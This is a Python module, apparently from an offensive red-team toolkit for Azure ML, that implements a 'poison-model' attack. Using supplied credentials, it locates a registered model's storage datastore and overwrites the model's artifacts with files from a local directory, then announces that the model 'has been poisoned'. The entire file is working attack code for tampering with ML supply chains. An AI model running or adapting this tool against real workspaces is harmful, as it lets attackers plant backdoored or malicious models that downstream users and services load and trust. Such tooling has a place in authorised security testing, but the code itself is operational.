import os
 
from pymlokit.platforms.azureml_api import (
     creds_valid,
     get_asset_prefixes,
     get_content_uris,
     get_datastore,
     get_model,
     list_datastores,
     upload_blob,
 )
from pymlokit.utils.arg_utils import generate_header
from pymlokit.utils.table import print_table
 
 
def _parse_artifact_location(content_uri: str) -> tuple[str, str, str, str]:
     datastore_type = ""
     if "blob.core.windows.net" in content_uri:
         datastore_type = "AzureBlob"
     elif "file.core.windows.net" in content_uri:
         datastore_type = "AzureFile"
 
     file_name = ""
     if "?" in content_uri and "/" in content_uri:
         file_name = content_uri[content_uri.rfind("/") + 1 : content_uri.find("?")]
 
     split_uri = content_uri.split("/")
     account_name = split_uri[2] if len(split_uri) > 2 else ""
     account_name = account_name.replace(".blob.core.windows.net", "").replace(".file.core.windows.net", "")
     container_name = split_uri[3] if len(split_uri) > 3 else ""
 
     rel_path = ""
     if container_name and file_name:
         start = content_uri.find(f"/{container_name}/")
         end = content_uri.find(f"{file_name}?")
         if start != -1 and end != -1 and end > start:
             path = content_uri[start:end]
             rel_path = path.replace(f"/{container_name}/", "")
 
     return datastore_type, account_name, container_name, rel_path
 
 
def run(
     credential: str,
     platform: str,
     subscription_id: str,
     region: str,
     resource_group: str,
     workspace: str,
     model_id: str,
     source_dir: str,
 ) -> None:
     print(generate_header("poison-model", platform))
 
     if not subscription_id or not region or not resource_group or not workspace or not model_id:
         print("")
         print("[-] ERROR: Missing one of required command arguments")
         print("")
         return
 
     print("")
     print(f"[*] INFO: Performing poison-model module for {platform}")
     print("")
     print("[*] INFO: Checking credentials provided")
     print("")
 
     if not creds_valid(credential):
         print("[-] ERROR: Credentials provided are INVALID. Check the credentials again.")
         print("")
         return
 
     print("[+] SUCCESS: Credentials provided are VALID.")
     print("")
 
     model = get_model(credential, subscription_id, region, resource_group, workspace, model_id)
     if not model:
         return
 
     print_table(
         ["Name", "ID", "Model Type", "Creation Time", "Update Time"],
         [[model["name"], model_id, model["model_type"], model["created_time"], model["modified_time"]]],
     )
 
     asset_id = str(model.get("asset_id", "") or "")
     prefixes = get_asset_prefixes(credential, subscription_id, region, resource_group, workspace, asset_id) if asset_id else []
 
     final_datastore_name = ""
     storage_container = ""
     relative_path = ""
 
     for prefix in prefixes:
         content_uris = get_content_uris(credential, subscription_id, region, resource_group, workspace, prefix)
         datastore_type = ""
         account_name = ""
         container_name = ""
         for u in content_uris:
             datastore_type, account_name, container_name, relative_path = _parse_artifact_location(u)
 
         print("")
         print("[*] INFO: Listing Model Artifact Location Info:")
         print("")
         print(f"Account Name: {account_name}")
         print("")
         print(f"Datastore Type: {datastore_type}")
         print("")
         print(f"Container Name: {container_name}")
         print("")
         print(f"Path: {relative_path}")
         print("")
 
         print("[*] INFO: Getting associated datastore for model artifacts:")
         print("")
 
         datastores = list_datastores(credential, subscription_id, region, resource_group, workspace)
         matches = [
             ds
             for ds in datastores
             if str(ds.get("account_name", "")).lower() == account_name.lower()
             and str(ds.get("container_name", "")).lower() == container_name.lower()
             and str(ds.get("datastore_type", "")).lower() == datastore_type.lower()
         ]
 
         for ds in matches:
             final_datastore_name = str(ds.get("name", "") or "")
             storage_container = str(ds.get("container_name", "") or "")
 
     print("")
     print("[*] INFO: Uploading model artifacts")
     print("")
 
     if not final_datastore_name or not source_dir:
         return
 
     datastore = get_datastore(credential, subscription_id, region, resource_group, workspace, final_datastore_name)
     if not datastore:
         return
 
     for file_path in sorted([os.path.join(source_dir, f) for f in os.listdir(source_dir)]):
         if not os.path.isfile(file_path):
             continue
         just_file_name = os.path.basename(file_path)
         print(f"[*] INFO: Uploading: {just_file_name}")
         print("")
         content = open(file_path, "rb").read()
         upload_blob(
             datastore["account_name"],
             datastore["credential"],
             storage_container,
             f"{relative_path}{just_file_name}",
             content,
         )
 
     print("[+] SUCCESS: Model has been poisoned with model artifacts specified in source directory")
     print("")
 
